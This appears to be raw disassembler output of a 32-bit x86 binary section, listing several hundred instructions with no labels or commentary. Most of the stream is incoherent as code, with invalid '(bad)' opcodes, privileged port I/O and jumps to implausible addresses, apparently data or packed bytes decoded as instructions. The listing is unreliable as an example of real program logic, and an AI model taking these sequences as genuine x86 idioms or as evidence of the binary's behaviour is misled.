  40182a:	add    BYTE PTR [ebx+0x756aec00],cl
  401830:	jne    0x401865
  401832:	inc    DWORD PTR [ebx]
  401834:	rcl    BYTE PTR [ecx+0x50],1
  401837:	push   eax
  401838:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40183e:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  401845:	sar    bh,0x84
  401848:	or     BYTE PTR [ebx],al
  40184a:	push   eax
  40184b:	add    BYTE PTR [ebx+0x453dc845],cl
  401851:	pushf  
  401852:	cmp    bh,al
  401854:	pushf  
  401855:	mov    ah,0x89
  401857:	test   eax,ebp
  401859:	clc    
  40185a:	inc    ebp
  40185b:	inc    ebp
  40185c:	mov    DWORD PTR [eax+eax*8],esi
  40185f:	sub    al,0x3b
  401861:	mov    BYTE PTR [ebx+ecx*4+0x59d8ec89],bl
  401868:	dec    ebp
  401869:	popa   
  40186a:	xor    eax,DWORD PTR [edi+0x3]
  40186d:	mov    ecx,DWORD PTR [ecx+0x4d59f4b4]
  401873:	popa   
  401874:	xor    eax,DWORD PTR [edi+0x3]
  401877:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40187e:	fsub   DWORD PTR [ebp-0x380064]
  401884:	int3   
  401885:	lea    eax,[ebp+0x45fff860]
  40188b:	push   eax
  40188c:	cmp    eax,0xc78d9c75
  401891:	pop    esp
  401892:	lods   al,BYTE PTR ds:[esi]
  401893:	inc    DWORD PTR [ebp+0x4508f8ff]
  401899:	mov    edi,DWORD PTR [edi]
  40189b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4018a2:	test   DWORD PTR [edi-0x8],edx
  4018a5:	inc    esi
  4018a6:	inc    ebp
  4018a7:	add    BYTE PTR [ecx],dh
  4018a9:	push   0x8b809c
  4018ae:	in     al,dx
  4018af:	inc    ebp
  4018b0:	push   ebp
  4018b1:	mov    esi,DWORD PTR [ebx]
  4018b3:	cld    
  4018b4:	add    eax,DWORD PTR [eax+0xf013b]
  4018ba:	adc    al,0x0
  4018bc:	add    bh,bh
  4018be:	jmp    0xbd19db
  4018c3:	add    BYTE PTR [ebp+0x45],cl
  4018c6:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4018cc:	dec    ebp
  4018cd:	push   0x38033
  4018d2:	cmp    eax,DWORD PTR [eax]
  4018d4:	unpcklps xmm7,xmm0
  4018d7:	jne    0x4018d9
  4018d9:	dec    DWORD PTR [ebx+0x5545cc18]
  4018df:	mov    DWORD PTR [ebx],esi
  4018e1:	shl    BYTE PTR [ebx],1
  4018e3:	inc    ebp
  4018e4:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4018ea:	retf   0x5575
  4018ed:	dec    DWORD PTR [ebx-0x5ba17e8]
  4018f3:	(bad)  
  4018f4:	stc    
  4018f5:	in     al,dx
  4018f6:	or     al,0x85
  4018f8:	dec    ebp
  4018f9:	clc    
  4018fa:	xor    eax,DWORD PTR [ebp+0x3]
  4018fd:	mov    ebp,ecx
  4018ff:	rol    BYTE PTR [eax],1
  401901:	inc    ebp
  401902:	add    BYTE PTR [eax-0x7747ab3],bh
  401908:	clc    
  401909:	inc    ebp
  40190a:	retf   
  40190b:	mov    edx,ebx
  40190d:	in     al,dx
  40190e:	(bad)  
  40190f:	retf   
  401910:	into   
  401911:	into   
  401912:	scas   eax,DWORD PTR es:[edi]
  401913:	dec    ebp
  401914:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40191a:	sub    ecx,esi
  40191c:	cmp    ecx,DWORD PTR [ebp+0x77]
  40191f:	(bad)  
  401920:	mov    edi,eax
  401922:	int3   
  401923:	test   DWORD PTR [ecx-0x74baff08],ecx
  401929:	cmp    ch,BYTE PTR [esp+ebx*4-0x57cc38ab]
  401930:	xor    eax,DWORD PTR [ebp+0x4503f803]
  401936:	(bad)  
  401938:	retf   0x559c
  40193b:	(bad)  
  40193c:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  401943:	inc    ebp
  401944:	add    eax,0xeb9c4d3e
  401949:	(bad)  
  40194a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  401950:	xor    ecx,DWORD PTR [ebp+0x33]
  401953:	mov    eax,DWORD PTR [ebx]
  401955:	call   0xce4fe45d
  40195a:	retf   0x55d1
  40195d:	test   BYTE PTR [ebx-0x5ff17fe],cl
  401963:	jmp    0x40195e
  401965:	add    BYTE PTR ds:0xebf44d8b,al
  40196b:	push   ebp
  40196c:	mov    ebp,DWORD PTR [ebx]
  40196e:	mov    eax,0x33f8558b
  401973:	retf   
  401974:	xor    ecx,esi
  401976:	add    edx,ecx
  401978:	add    eax,DWORD PTR [edx+0xca010f]
  40197e:	push   ebp
  40197f:	dec    ebp
  401980:	mov    ecx,DWORD PTR [ebx-0x34050718]
  401986:	stc    
  401987:	rol    DWORD PTR ds:0xebce4dd6,cl
  40198d:	scas   eax,DWORD PTR es:[edi]
  40198e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  401994:	xor    ebp,DWORD PTR [ebx]
  401996:	xor    edi,DWORD PTR [ebx]
  401998:	add    esi,DWORD PTR [edi+0x3]
  40199b:	mov    ecx,DWORD PTR [edi]
  40199d:	clc    
  40199e:	retf   0x55cb
  4019a1:	into   
  4019a2:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4019a9:	test   al,0x4d
  4019ab:	push   ebp
  4019ac:	jbe    0x4019e1
  4019ae:	mov    esi,DWORD PTR [ebx]
  4019b0:	mov    al,0x3
  4019b2:	push   ebp
  4019b3:	add    esi,DWORD PTR [ebx]
  4019b5:	rdpmc  
  4019b7:	retf   0x5503
  4019ba:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4019c0:	dec    ebp
  4019c1:	stc    
  4019c2:	mov    ecx,DWORD PTR [eax]
  4019c4:	or     BYTE PTR [ebp+0x4d],cl
  4019c7:	jmp    0x1341a57
  4019cc:	dec    ebp
  4019cd:	dec    ebp
  4019ce:	(bad)  
  4019cf:	mov    ebx,esp
  4019d1:	clc    
  4019d2:	test   ebx,ecx
  4019d4:	clc    
  4019d5:	ror    DWORD PTR [ebp-0x2a],cl
  4019d8:	mov    esi,ecx
  4019da:	lock scas eax,DWORD PTR es:[edi]
  4019dc:	inc    ebp
  4019dd:	mov    edi,DWORD PTR [edx]
  4019df:	hlt    
  4019e0:	pushf  
  4019e1:	jge    0x40196e
  4019e3:	sub    ebx,esp
  4019e5:	cmp    ecx,ebx
  4019e7:	ja     0x4019b7
  4019e9:	mov    ebp,DWORD PTR [eax-0x58]
  4019ec:	dec    ebp
  4019ed:	xor    ecx,DWORD PTR [di+0x3]
  4019f1:	mov    esp,esp
  4019f3:	clc    
  4019f4:	push   ebp
  4019f5:	retf   
  4019f6:	mov    dl,bl
  4019f8:	adc    esi,edx
  4019fa:	jb     0x4019ca
  4019fc:	add    BYTE PTR [edi-0xb7474b3],ch
  401a02:	lock jge 0x4019d0
  401a05:	sub    ecx,DWORD PTR [ebp+0x3b]
  401a08:	mov    esi,DWORD PTR [edi-0x20]
  401a0b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459f]
  401a12:	mov    BYTE PTR [ebx-0x34b20729],cl
  401a18:	mov    edx,ebx
  401a1a:	lock (bad) 
  401a1c:	ror    esi,cl
  401a1e:	push   ebp
  401a1f:	scas   eax,DWORD PTR es:[edi]
  401a20:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  401a26:	lahf   
  401a27:	sub    esi,DWORD PTR [edx]
  401a29:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  401a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a30:	xor    esp,DWORD PTR [ebx]
  401a32:	add    ecx,DWORD PTR [ebp-0x1c]
  401a35:	mov    edi,DWORD PTR [ebp-0x8]
  401a38:	mov    bl,cl
  401a3a:	cmp    dl,bl
  401a3c:	jb     0x401a0c
  401a3e:	add    dh,dl
  401a40:	dec    ebp
  401a41:	scas   eax,DWORD PTR es:[edi]
  401a42:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  401a48:	shr    DWORD PTR [ebx],cl
  401a4a:	into   
  401a4b:	cmp    edx,esi
  401a4d:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  401a53:	dec    ebp
  401a54:	dec    ebp
  401a55:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  401a5b:	retf   
  401a5c:	xor    edx,esi
  401a5e:	add    ecx,esi
  401a60:	imul   ecx,edx
  401a63:	mov    DWORD PTR [ebp+0x8],edx
  401a66:	xor    ecx,DWORD PTR [ebp+0x2b]
  401a69:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  401a6f:	add    esi,DWORD PTR [ebx]
  401a71:	rol    BYTE PTR [ebx],0x45
  401a74:	(bad)  
  401a77:	pushf  
  401a78:	jge    0x401a03
  401a7a:	xor    esp,eax
  401a7c:	sub    eax,DWORD PTR [ebp-0x73]
  401a7f:	(bad)  
  401a80:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  401a87:	dec    ebp
  401a88:	xchg   BYTE PTR [ebx],dh
  401a8a:	inc    DWORD PTR [ebx]
  401a8c:	(bad)  
  401a8d:	jmp    0x401adc
  401a8f:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401a95:	dec    ebp
  401a96:	into   
  401a97:	mov    ebp,DWORD PTR [edi-0x23737420]
  401a9d:	lahf   
  401a9e:	shl    DWORD PTR [edx],cl
  401aa0:	retf   0x5588
  401aa3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  401aa9:	add    eax,DWORD PTR [eax]
  401aab:	in     al,0x4d
  401aad:	push   ebp
  401aae:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  401ab4:	popa   
  401ab5:	add    ch,cl
  401ab7:	dec    ebp
  401ab8:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  401abe:	dec    ebp
  401abf:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  401ac5:	jge    0x401a95
  401ac7:	mov    BYTE PTR [edi+0xf723b3a],ch
  401acd:	add    cl,dh
  401acf:	dec    ebp
  401ad0:	dec    DWORD PTR [ebx-0x2c032301]
  401ad6:	inc    ebp
  401ad7:	push   ebp
  401ad8:	dec    DWORD PTR [ebx-0x73ff1f34]
  401ade:	lea    ebx,[edi-0x7400cdac]
  401ae4:	push   eax
  401ae5:	mov    ah,0x45
  401ae7:	push   ebp
  401ae8:	mov    esi,DWORD PTR [ebx]
  401aea:	les    esi,FWORD PTR [ebx]
  401aec:	add    BYTE PTR [ebx],al
  401aee:	inc    DWORD PTR [ebx]
  401af0:	mov    ecx,DWORD PTR [edi]
  401af2:	cld    
  401af3:	retf   0x4d80
  401af6:	add    DWORD PTR [ecx+0x4d30e400],ecx
  401afc:	jne    0x401a89
  401afe:	(bad)  
  401aff:	in     al,dx
  401b00:	ror    bl,1
  401b02:	pop    ebp
  401b03:	into   
  401b04:	add    BYTE PTR [edi-0xf2f7475],ch
  401b0a:	not    bl
  401b0c:	adc    al,0xca
  401b0e:	inc    ebp
  401b0f:	push   ebp
  401b10:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  401b16:	push   0xaf80d6
  401b1b:	mov    eax,DWORD PTR [eax]
  401b1d:	fdiv   st(7),st
  401b1f:	sti    
  401b20:	sbb    dh,cl
  401b22:	pop    esi
  401b23:	xchg   esp,eax
  401b24:	leave  
  401b25:	lahf   
  401b26:	add    al,0x32
  401b28:	push   ebp
  401b29:	cmp    ebp,esp
  401b2b:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  401b2f:	dec    DWORD PTR [ecx-0x740f0375]
  401b35:	push   ebp
  401b36:	cld    
  401b37:	xor    ecx,DWORD PTR [esi-0x76f07efd]
  401b3d:	retf   0x558b
  401b40:	clc    
  401b41:	xor    esi,eax
  401b43:	add    esi,DWORD PTR [ebp-0x75]
  401b46:	(bad)  
  401b47:	hlt    
  401b48:	or     cl,BYTE PTR [esi+eax*8-0x39cdf761]
  401b4f:	mov    DWORD PTR [edx],ecx
  401b51:	hlt    
  401b52:	(bad)  
  401b53:	dec    ebp
  401b54:	add    dh,BYTE PTR [ebx]
  401b56:	leave  
  401b57:	mov    edx,0xffec8d55
  401b5c:	push   ecx
  401b5d:	rol    DWORD PTR [ebp+0x55],1
  401b60:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  401b66:	mov    eax,0xf8030b33
  401b6b:	lar    ecx,di
  401b6e:	push   ebp
  401b6f:	retf   0x863b
  401b72:	jne    0x401b71
  401b74:	mov    edi,edi
  401b76:	or     BYTE PTR [ebp+0x41],dh
  401b79:	mov    esp,edx
  401b7b:	cld    
  401b7c:	inc    eax
  401b7d:	mov    al,0x15
  401b7f:	add    DWORD PTR [ecx+0x0],eax
  401b82:	in     eax,dx
  401b83:	test   DWORD PTR [ecx-0x1],eax
  401b86:	sar    bh,cl
  401b88:	ret    0x8b
  401b8b:	cld    
  401b8c:	mov    eax,DWORD PTR [eax+0x8d0151]
  401b92:	clc    
  401b93:	xor    BYTE PTR [ebp+0x45],al
  401b96:	mov    ecx,DWORD PTR [ebx+0x8ec0fc]
  401b9c:	loopne 0x401b9d
  401b9e:	mov    edi,edi
  401ba0:	mov    ecx,eax
  401ba2:	clc    
  401ba3:	jne    0x401b75
  401ba5:	call   0x812eae
  401baa:	adc    eax,0xc6854575
  401baf:	je     0x401bb2
  401bb1:	mov    eax,esi
  401bb3:	cld    
  401bb4:	or     DWORD PTR [eax+0x401c9],eax
  401bba:	push   ebp
  401bbb:	add    ah,ch
  401bbd:	add    BYTE PTR [ecx+0x6a],dl
  401bc0:	inc    ebp
  401bc1:	push   esi
  401bc2:	mov    DWORD PTR [eax-0x4],edx
  401bc5:	pop    edi
  401bc6:	mov    ebx,DWORD PTR [ebx-0x4]
  401bc9:	ret    0xb1
  401bcc:	push   es
  401bcd:	mov    ecx,DWORD PTR [ecx-0x77274af]
  401bd3:	clc    
  401bd4:	lock inc ebp
  401bd6:	jne    0x401c2e
  401bd8:	(bad)  
  401bd9:	jne    0x401bdf
  401bdb:	mov    eax,0xf841ba66
  401be0:	rol    BYTE PTR [esi],cl
  401be2:	(bad)  
  401be3:	jne    0x401c22
  401be5:	cmp    eax,ebx
  401be7:	pop    esi
  401be8:	mov    ecx,DWORD PTR [eax]
  401bea:	push   ecx
  401beb:	inc    ecx
  401bec:	lea    edi,[esi-0x8]
  401bef:	inc    edx
  401bf0:	inc    ebp
  401bf1:	int    0x8b
  401bf3:	inc    edx
  401bf4:	cld    
  401bf5:	jle    0x401bb5
  401bf7:	inc    ecx
  401bf8:	xchg   eax,ebp
  401bfa:	mov    ebx,eax
  401bfc:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  401c02:	or     edi,eax
  401c04:	inc    ebp
  401c05:	inc    ebp
  401c06:	(bad)  
  401c07:	mov    ecx,DWORD PTR [eax]
  401c09:	cld    
  401c0a:	(bad)  
  401c0b:	loop   0x401c0e
  401c0d:	mov    eax,esi
  401c0f:	mov    DWORD PTR ds:0x4f8c98b,eax
  401c15:	rcl    BYTE PTR [esi+0xf],1
  401c18:	iret   
  401c19:	inc    ebp
  401c1a:	leave  
  401c1b:	(bad)  
  401c1c:	dec    DWORD PTR [ecx]
  401c1e:	mov    eax,esi
  401c20:	mov    eax,DWORD PTR [edi]
  401c22:	mov    dh,0xdd
  401c25:	push   es
  401c26:	nop
  401c27:	(bad)  
  401c28:	inc    DWORD PTR [ebx]
  401c2a:	push   esi
  401c2b:	leave  
  401c2c:	iret   
  401c2d:	add    al,0x46
  401c2f:	push   ebp
  401c30:	loope  0x401c1e
  401c32:	push   ebp
  401c33:	push   ecx
  401c34:	inc    DWORD PTR [ebp+0x56]
  401c37:	mov    DWORD PTR [esi-0x4],eax
  401c3a:	in     eax,dx
  401c3b:	push   ebp
  401c3c:	sbb    BYTE PTR [eax+0x7c6daff],bh
  401c42:	add    al,BYTE PTR [edx]
  401c44:	mov    edx,DWORD PTR [ebp-0x17]
  401c47:	cmp    edi,esi
  401c49:	jne    0x401c4a
  401c4b:	(bad)  
  401c4c:	push   esi
  401c4d:	pop    es
  401c4e:	push   ebp
  401c4f:	mov    ebp,esp
  401c51:	or     BYTE PTR [ebp+0x41],al
  401c54:	add    edi,edx
  401c56:	sub    BYTE PTR [eax-0x4],al
  401c59:	ret    0xc275
  401c5c:	add    DWORD PTR [eax],eax
  401c5e:	sbb    al,0x8b
  401c60:	mov    edx,DWORD PTR [ecx+0x14]
  401c63:	lea    edx,[edx-0x1ba7508]
  401c69:	push   esi
  401c6a:	enter  0xd375,0xb8
  401c6e:	test   DWORD PTR [esi],0x6ce0750
  401c74:	enter  0xd375,0x3b
  401c78:	neg    DWORD PTR [esi+0x50]
  401c7b:	or     cl,dl
  401c7d:	inc    edx
  401c7e:	(bad)  
  401c7f:	jmp    0x36be470
  401c84:	inc    eax
  401c85:	jmp    0xc9901eda
  401c8a:	push   edi
  401c8b:	push   ebp
  401c8c:	imul   ah
  401c8e:	adc    DWORD PTR [ecx-0x1],0x45
  401c92:	add    BYTE PTR [ecx+0x55d3fc00],cl
  401c98:	lea    edi,[eax-0x7fff4ca]
  401c9e:	mov    eax,0x4550402
  401ca3:	cmp    ebp,ecx
  401ca5:	jne    0x401c52
  401ca7:	mov    eax,DWORD PTR ds:0x241e808
  401cad:	in     eax,dx
  401cae:	add    BYTE PTR [eax-0x7],al
  401cb1:	xlat   BYTE PTR ds:[ebx]
  401cb2:	ss inc ecx
  401cb4:	aas    
  401cb5:	loope  0x401d34
  401cb7:	ret    0x8b
  401cba:	lock mov edi,DWORD PTR [ebp-0x18]
  401cbe:	and    edi,edi
  401cc0:	mov    edi,edi
  401cc2:	call   0xe40e1d9e
  401cc7:	push   es
  401cc8:	add    al,ch
  401cca:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  401cd1:	(bad)  
  401cd2:	hlt    
  401cd3:	add    eax,0xffd3e87d
  401cd8:	cmp    bh,0x8
  401cdb:	(bad)  
  401cdc:	fld    DWORD PTR [esi]
  401cde:	out    dx,al
  401cdf:	call   0xff9f1be7
  401ce4:	cmp    al,0x46
  401ce6:	shr    eax,0x8
  401ce9:	(bad)  
  401cea:	pop    es
  401ceb:	fisttp QWORD PTR [ebp+0xe577eff]
  401cf1:	push   ebx
  401cf2:	add    BYTE PTR [ebx+0x24008b56],cl
  401cf8:	add    BYTE PTR [ebp+0x50],al
  401cfb:	push   eax
  401cfc:	add    DWORD PTR [ebx+0x757d1834],ecx
  401d02:	sub    edx,DWORD PTR [esi-0x24]
  401d05:	jne    0x401cbd
  401d07:	lods   eax,DWORD PTR ds:[esi]
  401d08:	mov    edx,DWORD PTR [edx-0x34]
  401d0b:	dec    esi
  401d0c:	out    0x83,eax
  401d0e:	into   
  401d0f:	push   edi
  401d11:	loopne 0x401ce1
  401d13:	shr    BYTE PTR [edx+ecx*4+0x0],1
  401d17:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  401d1e:	rol    DWORD PTR [edx],0x8
  401d21:	mov    esp,ecx
  401d23:	cmp    DWORD PTR [ebx],0xc
  401d26:	mov    esi,0x5001c0
  401d2b:	push   eax
  401d2c:	push   cs
  401d2d:	push   eax
  401d2e:	(bad)  
  401d2f:	sub    edx,edi
  401d31:	push   esi
  401d32:	adc    al,0xcb
  401d34:	ins    DWORD PTR es:[edi],dx
  401d35:	mov    eax,0x203e8
  401d3a:	add    al,ah
  401d3c:	inc    esi
  401d3d:	mov    al,ch
  401d3f:	pop    es
  401d40:	add    DWORD PTR [eax],0x1
  401d43:	add    dh,al
  401d45:	add    ah,ch
  401d47:	rol    DWORD PTR [edx-0xd],1
  401d4a:	cli    
  401d4b:	push   0x4a
  401d4d:	pop    ecx
  401d4e:	retf   0xfe6
  401d51:	add    BYTE PTR [ebx-0x4e72f41e],al
  401d57:	(bad)  
  401d58:	dec    BYTE PTR [ebx+0x45b1fc72]
  401d5e:	(bad)  
  401d5f:	sub    ebp,DWORD PTR [ebx]
  401d61:	and    al,0x52
  401d63:	(bad)  
  401d64:	dec    edi
  401d65:	inc    ebp
  401d66:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  401d6d:	add    BYTE PTR [ebp-0x7b],dh
  401d70:	pop    eax
  401d71:	add    BYTE PTR [edx+0x0],bl
  401d74:	pop    edx
  401d75:	dec    ebp
  401d76:	jmp    DWORD PTR [ebx]
  401d78:	and    al,0xec
  401d7a:	push   edx
  401d7b:	out    0x64,eax
  401d7d:	jmp    0xd3f21382
  401d82:	jmp    0x401ddc
  401d84:	mov    al,0xfe
  401d86:	dec    BYTE PTR [ebp-0x18fd8018]
  401d8c:	add    BYTE PTR [esi+ebp*1],bh
  401d8f:	pop    edx
  401d90:	icebp  
  401d91:	mov    eax,cs
  401d93:	ins    BYTE PTR es:[edi],dx
  401d94:	adc    eax,0x75510000
  401d99:	mov    esi,0x70158
  401d9e:	or     DWORD PTR [eax-0x74f48dfe],esi
  401da4:	mov    edi,esp
  401da6:	cld    
  401da7:	jge    0x401e1e
  401da9:	(bad)  
  401dab:	aas    
  401dac:	and    al,0x6d
  401dae:	adc    cl,0x1
  401db1:	mov    eax,DWORD PTR [eax]
  401db3:	and    ecx,DWORD PTR [ebx-0x167203fd]
  401db9:	dec    ebp
  401dba:	add    eax,ebp
  401dbc:	add    BYTE PTR [edx],al
  401dbe:	fadd   DWORD PTR [eax]
  401dc0:	stc    
  401dc1:	enter  0xee00,0x8b
  401dc5:	sbb    eax,0x1
  401dc8:	sbb    esi,ecx
  401dca:	in     al,0x0
  401dcc:	in     eax,dx
  401dcd:	add    BYTE PTR [eax],al
  401dcf:	jne    0x401d5c
  401dd1:	cmp    edx,esp
  401dd3:	jb     0x401dde
  401dd5:	jmp    0x401e4c
  401dd7:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  401ddd:	add    BYTE PTR [ebx+0x4d83d840],cl
  401de3:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  401de9:	jb     0x401d74
  401deb:	pop    edx
  401dec:	fadd   QWORD PTR [ebx-0x7445faa1]
  401df2:	or     dh,BYTE PTR [edx+0x0]
  401df5:	inc    edx
  401df6:	or     dl,bh
  401df8:	xlat   BYTE PTR ds:[ebx]
  401df9:	dec    edx
  401dfa:	push   edi
  401dfb:	add    al,0x7
  401dfd:	leave  
  401dfe:	rol    DWORD PTR [edx+eax*1],0x7
  401e02:	add    ecx,ecx
  401e04:	mov    edx,ecx
  401e06:	int3   
  401e07:	jmp    0x401dc7
  401e09:	mov    al,0x0
  401e0b:	(bad)  
  401e0c:	jne    0x401df6
  401e0e:	mov    eax,DWORD PTR [edx]
  401e10:	call   0xc1549b15
  401e15:	pop    edi
  401e16:	add    ebx,DWORD PTR [ecx-0x37]
  401e19:	pop    ecx
  401e1a:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  401e21:	push   es
  401e22:	mov    eax,DWORD PTR [eax]
  401e24:	int3   
  401e25:	add    ch,al
  401e27:	jae    0x401e11
  401e29:	int    0x1
  401e2b:	enter  0x3000,0x18
  401e2f:	add    BYTE PTR [ebp+0x75],al
  401e32:	mov    esi,DWORD PTR [eax-0x171f0134]
  401e38:	push   0x2
  401e3a:	pop    ecx
  401e3b:	add    BYTE PTR [eax],cl
  401e3d:	push   ebx
  401e3e:	lea    edi,[edi+eax*2]
  401e41:	mov    al,0x1
  401e43:	jb     0x401e45
  401e45:	mov    al,0x10
  401e47:	push   eax
  401e48:	add    al,0x75
  401e4a:	add    BYTE PTR [ebx],ch
  401e4c:	add    ebx,esp
  401e4e:	int3   
  401e4f:	jne    0x401e61
  401e51:	movsx  edx,cl
  401e54:	add    DWORD PTR [eax],eax
  401e56:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  401e5d:	mov    gs,edi
  401e5f:	add    BYTE PTR [eax-0x50],ch
  401e62:	add    al,ch
  401e64:	mov    eax,DWORD PTR [ecx]
  401e66:	sub    eax,DWORD PTR [eax]
  401e68:	jb     0x401edf
  401e6a:	add    DWORD PTR [esp+eiz*8-0x50],esi
  401e6e:	jge    0x401e58
  401e70:	add    al,0x1
  401e72:	add    DWORD PTR [eax],0x0
  401e75:	jne    0x401e77
  401e77:	je     0x401ebe
  401e79:	mov    eax,DWORD PTR [edi]
  401e7b:	ror    BYTE PTR [ebp+0x4d],1
  401e7e:	or     DWORD PTR [ecx+0x4d03d004],0x3
  401e85:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  401e8b:	mov    DWORD PTR [ebx],ebp
  401e8d:	fadd   DWORD PTR [eax+0x75]
  401e90:	inc    eax
  401e91:	pop    eax
  401e92:	lea    ebx,[ecx+0x4f]
  401e95:	push   0xb1000003
  401e9a:	out    dx,eax
  401e9b:	add    ebp,DWORD PTR [edx+edx*2]
  401e9e:	add    BYTE PTR [ebx+ecx*4],bh
  401ea1:	mov    ch,BYTE PTR [ebx]
  401ea3:	jb     0x401f17
  401ea5:	add    al,0x89
  401ea7:	push   eax
  401ea8:	call   0x84286c1a
  401ead:	add    DWORD PTR [eax+eax*1],eax
  401eb0:	jae    0x401ec6
  401eb2:	icebp  
  401eb3:	inc    ebp
  401eb4:	mov    eax,DWORD PTR gs:[ecx]
  401eb7:	int3   
  401eb8:	out    dx,al
  401eb9:	loopne 0x401f08
  401ebb:	sub    eax,DWORD PTR [edx]
  401ebd:	push   0xffffff83
  401ebf:	pop    esi
  401ec0:	push   cs
  401ec1:	jl     0x401edc
  401ec3:	add    al,0xaf
  401ec5:	xor    eax,0x832b6d00
  401eca:	mov    eax,DWORD PTR [edx]
  401ecc:	rcr    BYTE PTR [ebp+0x754500dc],cl
  401ed2:	ror    DWORD PTR [ebx+0x7dc8e803],1
  401ed8:	inc    ebp
  401ed9:	shr    ebx,0x3
  401edc:	or     DWORD PTR [eax],0x4
  401edf:	push   0xffffffa5
  401ee1:	pop    esi
  401ee2:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  401ee9:	jmp    0x401f48
  401eeb:	mov    edi,0xff0272
  401ef0:	fdivr  QWORD PTR [ebp+0x5d]
  401ef3:	push   0x4e
  401ef5:	pop    ecx
  401ef6:	call   0x4062fb
  401efb:	mov    DWORD PTR [ebx],eax
  401efd:	in     al,0xc8
  401eff:	rol    BYTE PTR [ebp-0x75],0xc1
  401f03:	call   0xaa20e4
  401f08:	pop    esi
  401f09:	enter  0xceff,0x8b
  401f0d:	repz mov ecx,DWORD PTR [ebp-0x34]
  401f11:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  401f18:	je     0x401f1a
  401f1a:	or     DWORD PTR [ebx-0x74183b24],eax
  401f20:	jne    0x401f06
  401f22:	jmp    0x401f1d
  401f24:	push   DWORD PTR [edx-0x24]
  401f27:	push   0x4d
  401f29:	pop    ecx
  401f2a:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  401f2e:	jge    0x401f36
  401f30:	mov    eax,eax
  401f32:	sub    ebp,DWORD PTR [edx+0x24]
  401f35:	pop    esi
  401f36:	inc    ebp
  401f37:	mov    esp,0x8b6077
  401f3c:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  401f42:	lods   al,BYTE PTR ds:[esi]
  401f43:	add    BYTE PTR [ebx],bh
  401f45:	enter  0xce73,0x49
  401f49:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  401f51:	stc    
  401f52:	jge    0x401fc6
  401f54:	jnp    0xdd3fa2b5
  401f5a:	call   0xc32030
  401f5f:	fadd   st(0),st
  401f61:	dec    esi
  401f62:	ins    BYTE PTR es:[edi],dx
  401f63:	stc    
  401f64:	cmp    al,0x73
  401f66:	push   ebp
  401f67:	mov    eax,0xf8028b
  401f6c:	jne    0x401f2f
  401f6e:	mov    esi,ecx
  401f70:	mov    esp,DWORD PTR [ebp+0x2c]
  401f73:	add    edi,DWORD PTR [ebp-0x24]
  401f76:	sub    esp,eax
  401f78:	and    al,0x45
  401f7a:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  401f80:	sbb    al,0xee
  401f82:	pop    esi
  401f83:	call   0x801fb3
  401f88:	fsubr  st,st(3)
  401f8a:	sti    
  401f8b:	add    BYTE PTR gs:[ecx],bh
  401f8e:	add    eax,esp
  401f90:	add    DWORD PTR [esi],eax
  401f92:	rol    DWORD PTR [ebp+0x8],0x29
  401f96:	mov    esp,eax
  401f98:	clc    
  401f99:	jne    0x402010
  401f9b:	mov    eax,0x8b0673
  401fa0:	loopne 0x401fe7
  401fa2:	loopne 0x401f2d
  401fa4:	lods   al,BYTE PTR ds:[esi]
  401fa5:	int3   
  401fa6:	inc    ebp
  401fa7:	mov    DWORD PTR gs:[eax+edi*8],eax
  401fab:	add    al,0xc3
  401fad:	sub    ecx,DWORD PTR [ebp+0x47]
  401fb0:	(bad)  
  401fb2:	shr    BYTE PTR [ebp-0x1f],0xe8
  401fb6:	add    eax,DWORD PTR [eax]
  401fb8:	call   0x641e0bd
  401fbd:	add    esi,DWORD PTR [esi-0x3b2efc83]
  401fc3:	dec    esi
  401fc4:	ins    DWORD PTR es:[edi],dx
  401fc5:	in     al,dx
  401fc6:	lea    eax,[eax]
  401fc8:	inc    ebp
  401fc9:	inc    ebp
  401fca:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  401fd0:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  401fda:	and    al,0xdc
  401fdc:	ror    DWORD PTR [edx+0x24],0xf7
  401fe0:	or     BYTE PTR [ebp+0x4c],dh
  401fe3:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  401fe7:	stos   BYTE PTR es:[edi],al
  401fe8:	adc    edx,edi
  401fea:	inc    esp
